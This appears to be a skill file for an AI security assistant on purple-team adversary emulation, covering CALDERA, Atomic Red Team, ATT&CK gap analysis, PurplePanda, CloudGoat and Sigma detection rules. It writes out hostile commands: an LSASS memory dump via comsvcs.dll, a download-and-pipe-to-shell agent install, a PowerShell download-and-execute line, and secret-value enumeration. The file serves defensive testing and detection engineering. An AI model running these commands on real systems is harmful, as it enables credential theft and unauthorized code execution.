<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# SKILL: Purple Team / Adversary Emulation

## Activation
Triggered when the operator asks about purple team exercises, adversary emulation,
CALDERA, Atomic Red Team, ATT&CK Navigator, detection coverage mapping, coverage gap
analysis, emulation planning, control validation, detection engineering, bridging red
and blue team findings, or joint red/blue exercises.

## Quick Reference
- CALDERA start: `python3 server.py --insecure --build` → login http://localhost:8888 (red/admin)
- CALDERA REST create operation: `POST /api/v2/operations` with adversary_id, planner, group
- Atomic Red Team run: `Invoke-AtomicTest T1003.001 -GetPrereqs && Invoke-AtomicTest T1003.001`
- Atomic cleanup: `Invoke-AtomicTest T1003.001 -Cleanup`
- Coverage check: `wc -l` ATT&CK Navigator layer JSON; count colored (covered) vs grey (gap) techniques
- PurplePanda enumerate GCP+K8s: `python3 main.py -e -p google,k8s --k8s-get-secret-values --gcp-get-secret-values`
- PurplePanda privesc query (Neo4j): `MATCH(p)-[r:PRIVESC]->(res) RETURN p,r,res`
- CloudGoat deploy scenario: `./cloudgoat.py create iam_privesc_by_rollback`
- CloudGoat destroy: `./cloudgoat.py destroy iam_privesc_by_rollback`
- Navigator layer export: download JSON from ATT&CK Navigator → import to CALDERA Compass plugin
- Detection gap table: Technique | Coverage Level | Gap | Log Source Needed | Rule Recommendation

## Competencies

### CALDERA Operation Setup and Adversary Profiles

**Server and agent deployment:**
```bash
# Start CALDERA (Python venv recommended)
git clone  --recursive
pip3 install -r requirements.txt
python3 server.py --insecure --build    # UI on :8888
# Docker
docker run -p 8888:8888 ghcr.io/mitre/caldera:latest
```

Deploy Sandcat agent (default Go-based implant):
```bash
# From CALDERA server — generates platform-specific dropper
curl -s -X POST http://localhost:8888/file/download \
  -H 'KEY: ADMIN123' \
  -d '{"file":"sandcat.go-windows","type":"agent"}' > agent.exe
# Linux beacon
curl -s http://localhost:8888/file/download \
  -H 'KEY: ADMIN123' -d '{"file":"sandcat.go-linux"}' | sh &
```

**Adversary profile YAML structure** (place in `data/adversaries/`):
```yaml
id: d0a0a0a0-0000-0000-0000-000000000001
name: APT29-Emulation
description: Cozy Bear TTP emulation — credential access + lateral movement
atomic_ordering:
  - 6b55a4b0-b5d5-4b3a-8b14-9f3e5b01e8c2  # ability UUID: LSASS dump
  - e9a3babc-d62b-4bab-a3bf-c4fe3e09a85b  # ability UUID: lateral move SMB
  - b3d3cb6b-a2c2-4b7a-9a1d-e01c0c2e6c3f  # ability UUID: DCSync
tags: [credential-access, lateral-movement, collection]
```

**Ability YAML structure** (place in `data/abilities/{tactic}/`):
```yaml
id: 6b55a4b0-b5d5-4b3a-8b14-9f3e5b01e8c2
name: LSASS Comsvcs Dump
description: Dump LSASS via comsvcs.dll LOLBin
tactic: credential-access
technique:
  attack_id: T1003.001
  name: OS Credential Dumping - LSASS Memory
executors:
  - name: psh
    platform: windows
    command: |
      $lsass = Get-Process lsass | Select-Object -ExpandProperty Id
      rundll32 C:\windows\system32\comsvcs.dll, MiniDump $lsass C:\windows\temp\ls.dmp full
    cleanup:
      - Remove-Item C:\windows\temp\ls.dmp -Force -ErrorAction Ignore
    parsers:
      - module: app.parsers.basic
        parserconfigs:
          - source: host.user.name
            edge: has_credential
```

**Create operation via REST API:**
```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H 'KEY: ADMIN123' -H 'Content-Type: application/json' \
  -d '{
    "name": "APT29 Emulation Run 1",
    "adversary": {"adversary_id": "d0a0a0a0-0000-0000-0000-000000000001"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "red",
    "auto_close": true,
    "obfuscator": "base64",
    "visibility": 51
  }'
# Planners: atomic (sequential per agent), batch (all agents simultaneously)
# Obfuscators: plain-text, base64, caesar — affects payload encoding in transit
# Visibility: 1-100 — lower = more evasive (CALDERA auto-skip high-viz links)
```

**Anti-pattern:** Running CALDERA with default API keys (`ADMIN123`, `BLUEADMIN123`) in any environment accessible beyond localhost — override in `conf/local.yml` before use.

### Atomic Red Team Testing

Atomic Red Team maps individual ATT&CK techniques to minimal reproducible tests.

```powershell
# Install (Windows)
Install-Module -Name invoke-atomicredteam, powershell-yaml -Scope CurrentUser
Import-Module Invoke-AtomicRedTeam
IEX (New-Object Net.WebClient).DownloadString('https://...')  # or clone locally

# List available tests for technique
Invoke-AtomicTest T1003.001 -ShowDetailsBrief

# Run with prereqs check
Invoke-AtomicTest T1003.001 -GetPrereqs
Invoke-AtomicTest T1003.001

# Run specific test number
Invoke-AtomicTest T1003.001 -TestNumbers 2

# Cleanup artifacts
Invoke-AtomicTest T1003.001 -Cleanup

# Run all tests for a tactic
Get-AtomicTechnique -Path "C:\AtomicRedTeam\atomics" | Where-Object {$_.tactic -eq "credential-access"} |
  Invoke-AtomicTest -GetPrereqs -Cleanup
```

Linux atomic tests:
```bash
# BASH-based atomics
bash atomic-red-team/atomics/T1059.004/T1059.004.sh
# Python executor
python3 atomic-red-team/atomics/T1005/T1005.py
```

Custom atomic design when no existing test covers your variant:
```yaml
# atomic-red-team/atomics/T1078.004/T1078.004.yaml
attack_technique: T1078.004
display_name: Valid Accounts - Cloud Accounts
atomic_tests:
  - name: AWS stolen token usage
    description: Use a stolen AWS session token to enumerate IAM
    platforms:
      linux:
        command: |
          aws sts get-caller-identity --profile #{compromised_profile}
          aws iam list-attached-user-policies --user-name #{user_name} --profile #{compromised_profile}
        cleanup_command: aws configure --profile #{compromised_profile} --reset
    input_arguments:
      compromised_profile:
        description: AWS CLI profile with stolen credentials
        type: string
        default: attacker
```

**Anti-pattern:** Running Atomic tests against production systems — CALDERA and Atomic generate real artifacts (memory dumps, registry changes, network connections). Always use dedicated lab hosts with rollback capability (snapshots or CloudGoat).

### ATT&CK Coverage Mapping and Gap Analysis

**Coverage measurement methodology:**
1. Export current detection rules as a list of technique IDs (from Splunk, Elastic, Sigma rule set)
2. Load techniques into ATT&CK Navigator → color covered techniques green
3. Identify gaps (grey techniques) — prioritize by threat actor relevance
4. Classify coverage levels per technique:
   - **Blind spot**: No logging at all for this technique (e.g., no Sysmon = no T1055 detection possible)
   - **Gap**: Logging exists but no rule written
   - **Partial**: Rule exists for one sub-variant only
   - **Covered**: Rule covers all meaningful variants with alerting

**ATT&CK Navigator layer JSON format** (for programmatic coverage tracking):
```json
{
  "name": "Current Detection Coverage",
  "versions": {"attack": "14", "navigator": "4.9"},
  "domain": "enterprise-attack",
  "techniques": [
    {"techniqueID": "T1003.001", "score": 100, "comment": "Sysmon EID 10 + rule deployed"},
    {"techniqueID": "T1059.001", "score": 50,  "comment": "PowerShell AMSI but no Sigma rule"},
    {"techniqueID": "T1021.002", "score": 0,   "comment": "No SMB lateral movement detection"}
  ],
  "gradient": {"colors": ["#ff6666", "#ffe766", "#8ec843"], "minValue": 0, "maxValue": 100}
}
```

**Gap analysis table format:**
| Technique | Name | Coverage | Gap | Log Source | Rule Needed |
|-----------|------|----------|-----|------------|-------------|
| T1003.001 | LSASS Dump | Partial | comsvcs.dll variant not covered | Sysmon EID 10 | Process accessing lsass.exe from rundll32 |
| T1055.012 | Process Hollowing | Blind | No memory analysis logging | Sysmon EID 8 | CreateRemoteThread from non-standard parent |
| T1021.006 | WinRM | Gap | WinRM logging not enabled | EventLog 4688 | Enable WinRM audit + rule on wsmprovhost.exe |

**Coverage-per-tactic summary** (quick health check):
```
Tactic                  | Covered | Gap | Blind | Total | %
Initial Access          |   5     |  3  |   2   |  10   | 50%
Execution               |   8     |  4  |   1   |  13   | 62%
Credential Access       |   3     |  5  |   3   |  11   | 27%  ← priority
Lateral Movement        |   2     |  6  |   2   |  10   | 20%  ← priority
```

**Anti-pattern:** Measuring coverage by rule count rather than technique coverage — 100 rules covering 5 techniques is worse than 20 rules covering 25 techniques. Map rules to ATT&CK IDs before claiming coverage.

### Emulation Planning (Threat Intel to Test Plan)

Translate a threat actor profile or incident report into a sequenced emulation plan:

**Step 1: TTP extraction from source intel**
- ISAC reports, CISA advisories, vendor threat reports → extract observable behaviors
- Map each behavior to ATT&CK technique (use ATT&CK search; accept sub-technique specificity)
- Sequence by kill chain phase — Initial Access → Execution → Persistence → ... → Impact

**Emulation plan template per technique:**
```markdown
## T1566.001 — Spearphishing Attachment

**Threat Actor Context:** APT29 sends macro-enabled DOCX to targeted recipients

**Prerequisites:**
- Test host with Microsoft Office (no ATP)
- SMTP relay for delivery (or local file drop as proxy)

**Procedure:**
1. Create macro-enabled DOCX with calc.exe payload (benign indicator)
2. Deliver to test mailbox
3. User opens attachment, enables macros
4. Verify: calc.exe spawned as child of winword.exe

**Expected Log Artifacts:**
- Sysmon EID 1: winword.exe → cmd.exe (process creation)
- Sysmon EID 11: DOCX written to %TEMP% (file creation)
- Office Protected View bypass: Registry key HKCU\...\Security\Trusted Locations

**Detection Hypothesis:**
Office application spawning cmd.exe, powershell.exe, or wscript.exe

**Pass Criteria:** Alert fires within 5 minutes of execution
**Fail Criteria:** No alert; add Sigma rule: `ParentImage|endswith: '\winword.exe' AND Image|endswith: '\cmd.exe'`
```

**CloudGoat scenarios as cloud emulation exercises:**

| Scenario | Attack Path | Detection Focus |
|----------|-------------|-----------------|
| `iam_privesc_by_rollback` | IAM policy version rollback → admin | CloudTrail: `iam:SetDefaultPolicyVersion` |
| `cloud_breach_s3` | SSRF → IMDS → role creds → S3 exfil | VPC Flow Logs + S3 object-level logging |
| `ec2_ssrf` | SSRF metadata access → credential theft | IMDSv2 enforcement + `iam:GetCredentialReport` |
| `ecs_privesc_evade_protection` | ECS task privilege escalation | ECS exec logging + CloudTrail `ecs:ExecuteCommand` |
| `detection_evasion` | Honeytoken identification + legitimate cred use | CloudTrail anomaly; `sdb:ListDomains` = honeytoken probe |
| `iam_privesc_by_attachment` | Attaching admin policy to self | CloudTrail: `iam:AttachUserPolicy` from non-admin identity |
| `lambda_privesc` | Lambda environment variable → escalation | CloudTrail: `lambda:UpdateFunctionCode` + `sts:AssumeRole` |

```bash
# Deploy CloudGoat scenario
cd cloudgoat && python3 cloudgoat.py config profile <your-aws-profile>
python3 cloudgoat.py create iam_privesc_by_rollback
# Follow cheat_sheet.md for attack steps
python3 cloudgoat.py destroy iam_privesc_by_rollback  # clean up after exercise
```

**Anti-pattern:** Designing emulation plans from ATT&CK technique pages alone — actual threat actor procedures differ from the technique description. Use threat reports (CISA advisories, Mandiant APT profiles) for procedure-level fidelity.

### Cloud Privilege Enumeration with PurplePanda

PurplePanda enumerates cloud/SaaS platforms (GCP, GitHub, K8s, Concourse, CircleCI) and identifies privilege escalation paths using Neo4j graph analysis.

```bash
# Setup
export PURPLEPANDA_NEO4J_URL="bolt://neo4j@localhost:7687"
export PURPLEPANDA_PWD="s3cr3tpassword"
# GCP + GitHub + K8s enumeration
python3 main.py -e -p google,github,k8s \
  --github-only-org --k8s-get-secret-values --gcp-get-secret-values

# Analysis mode (quick check with known credentials)
python3 main.py -a -p google
```

**Key Neo4j queries for privesc investigation:**
```cypher
// All principals with any privesc path
MATCH(p)-[r:PRIVESC]->(res) RETURN p,r,res

// Full privesc path for a specific principal
MATCH (ppal:GcpPrincipal) WHERE ppal.email = "user@domain.com"
OPTIONAL MATCH r1 = (ppal)-[:PRIVESC*..]->(res1)
OPTIONAL MATCH r2 = (ppal)-[:MEMBER_OF*..]->(g)-[:PRIVESC*..]->(res2)
RETURN ppal,res1,g,res2

// Cross-platform privesc (GCP principal → external platform)
MATCH(attacker:Gcp)-[r:PRIVESC]->(victim) WHERE NOT "Gcp" IN labels(victim)
RETURN attacker, r, victim

// GitHub: who can steal secrets
MATCH(u:GithubUser{name:"targetuser"})-[r:CAN_STEAL_SECRET]->(s:GithubSecret)
RETURN u,r,s

// K8s: namespace with AWS IAM role bindings
MATCH(n:K8sNamespace) WHERE n.iam_amazonaws_com_permitted <> "" RETURN n

// GCP: SAs with cross-project permissions (blast radius indicator)
MATCH (sa:GcpServiceAccount)-[rel:HAS_ROLE]->(res:Gcp)
WHERE EXISTS((sa)-[:PART_OF]->(:GcpProject))
AND NOT EXISTS((sa)-[:PART_OF]->(res)) RETURN sa, rel, res
```

**Purple team use:** Run PurplePanda with blue team credentials (read-all) pre-exercise to identify which paths are theoretically exploitable — then emulate only those confirmed in environment. Eliminates wasted test cycles on unexploitable paths.

**Anti-pattern:** Using PurplePanda enumeration output directly as a finding report — the graph shows what's possible, not what's exploitable from attacker's entry point. Scope to realistic initial access → privesc chains.

### Detection Validation and Tuning

Coordinated test cycle for each technique in emulation plan:

```
1. RED executes technique (CALDERA ability or Atomic test)
2. BLUE observes in real-time (SIEM, EDR console)
3. Check: did alert fire?
   YES → record detection time, rule name, confidence (FP rate)
   NO  → check if log source captured the event first
         NO LOG → blind spot; fix log source before writing rule
         LOG EXISTS → gap; write and deploy Sigma rule
4. BLUE tunes rule if FP rate > threshold
5. Document outcome in gap analysis table
```

**Detection time measurement (MTTD per technique):**
```
T_exec = timestamp when red team ran technique (CALDERA operation log)
T_alert = timestamp when SIEM alert fired
MTTD_technique = T_alert - T_exec
Target: MTTD < 5 min for high-severity TTPs, < 60 min for medium
```

**Sigma rule template for new gaps:**
```yaml
title: Suspicious LSASS Access via Comsvcs DLL
status: experimental
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        SourceImage|endswith: '\rundll32.exe'
        CallTrace|contains: 'comsvcs.dll'
    condition: selection
falsepositives:
    - Unlikely in most environments
level: high
tags:
    - attack.credential_access
    - attack.t1003.001
```

**Control validation (pass/fail methodology):**
- State the claim: "EDR blocks LSASS dumping"
- Run atomic test: `Invoke-AtomicTest T1003.001`
- Observe: Did EDR block? Was dump created? Did alert fire?
- Document: "EDR blocked comsvcs.dll method. Mimikatz sekurlsa:: was not blocked — gap."
- Produce evidence artifact: screenshot, alert timestamp, file-exists check

**Anti-pattern:** Running detection validation without establishing baselines first — if Sysmon isn't collecting process access events (EID 10), no LSASS rule will ever fire regardless of quality. Verify log collection before writing rules.

### Purple Team Exercise Structure

**Pre-exercise (scope and rules of engagement):**
- Define crown jewels (what attacker is trying to reach)
- Define starting position (external unauthenticated, or compromised insider)
- Systems in scope / out of scope — written authorization
- Notification: SOC/blue team knows exercise is happening (unlike red team; purple is collaborative)
- Success metrics: MTTD per TTP, detection rate %, coverage gap delta

**Execution (coordinated):**
- Red executes one technique at a time — blue has 15 min to detect before moving on
- Blue monitors SIEM/EDR console in real-time; notes detection time and rule name
- Joint slack/teams channel: red posts "executing T1003.001 now" → blue confirms if detected
- Log all executed techniques with timestamps for post-exercise timeline correlation

**Debrief (after-action):**
- Overlay red team timeline vs. blue team detection timeline
- For each technique: detected/not detected, MTTD, FP count
- Gap analysis output: prioritized list of new rules needed by severity
- Coverage delta: Navigator layer before vs. after (how many techniques moved from grey to green)

**Exercise report structure:**
```
Purple Team Exercise Report
Date / Scope / Threat Actor Emulated
Executive Summary: X of Y techniques detected (Z% detection rate)
MTTD: average Xmin for detected techniques

Technique Results Table:
| ATT&CK ID | Technique | Detected | MTTD | Rule | Gap/Recommendation |

Blind Spots (no logging): [list]
Coverage Gaps (logging, no rule): [list with Sigma rule recommendations]
New Rules Deployed During Exercise: [list]
Recommended Priority Remediation: [top 5 gaps by risk]
```

**Anti-pattern:** Purple team exercises without follow-through — exercise identifies gaps but no sprint is scheduled to close them. Block time before the exercise to commit to a remediation sprint within 30 days of the report.

## Key Chains

### Full Purple Team Exercise Flow (On-Prem AD Environment)

1. Pre-exercise: Export current Sigma/KQL rules → generate ATT&CK Navigator coverage layer → identify top 10 gap techniques
2. Build CALDERA adversary profile targeting the 10 gap techniques (ability UUIDs mapped from ATT&CK)
3. Deploy Sandcat agent on test Windows host in isolated VLAN
4. Run CALDERA operation (atomic planner) — red team monitors operation chain
5. Blue team watches SIEM/EDR in real-time with joint comms channel
6. For each technique: record T_exec, check T_alert → calculate MTTD
7. Post-exercise: for each gap technique, write Sigma rule → deploy to SIEM → re-run Atomic test to validate rule fires
8. Update Navigator layer: move closed gaps from grey to green → calculate coverage delta
9. Schedule next exercise at 90-day cadence; focus on new gap techniques

### Detection Gap Closure Workflow

1. Identify gap: technique executed, no alert fired
2. Check log source: `index=sysmon EventCode=10 TargetImage="*lsass*"` — did event appear?
   - No events → blind spot: enable Sysmon with correct config (SwiftOnSecurity template)
   - Events present → gap: write rule
3. Write Sigma rule targeting the specific log field that differentiates malicious from benign
4. Convert to SIEM syntax: `sigma convert -t splunk -p splunk_cim rule.yml`
5. Deploy as detection (alert threshold: severity=high → alert; medium → report only)
6. Run atomic test again: verify alert fires within 60 seconds of execution
7. Monitor for 1 week: tune if FP rate > 5% (add filter conditions, raise threshold)
8. Mark technique as "Covered" in Navigator layer

### Emulation-to-Detection Pipeline (Cloud — AWS)

1. Deploy CloudGoat scenario: `./cloudgoat.py create iam_privesc_by_rollback`
2. Enable CloudTrail + S3 object-level logging + GuardDuty in test AWS account
3. Execute attack path per scenario cheat sheet (IAM SetDefaultPolicyVersion → admin)
4. Query CloudTrail: `aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=SetDefaultPolicyVersion`
5. Check GuardDuty findings: `aws guardduty list-findings --detector-id <id>`
6. Write detection rule: CloudTrail event `iam:SetDefaultPolicyVersion` from non-admin, non-automation identity → alert
7. Validate: re-run attack → confirm alert fires in GuardDuty or SIEM
8. Document: CloudTrail log field → detection logic → alert in gap analysis table
9. Destroy scenario: `./cloudgoat.py destroy iam_privesc_by_rollback`

---
v1.1 | Validated: 2026-03-13
